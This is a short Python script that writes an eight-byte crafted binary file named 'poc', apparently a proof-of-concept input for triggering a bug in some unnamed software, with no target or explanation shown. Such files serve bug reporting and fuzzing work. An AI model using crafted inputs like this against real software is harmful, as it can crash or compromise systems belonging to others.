def gen_poc():
    arr = [0x30, 0x62, 0x04, 0xc8, 0x00, 0x00, 0x00, 0x00]
    with open("poc", "wb") as fp:
        fp.write(bytearray(arr))

if __name__ == '__main__':
    gen_poc()
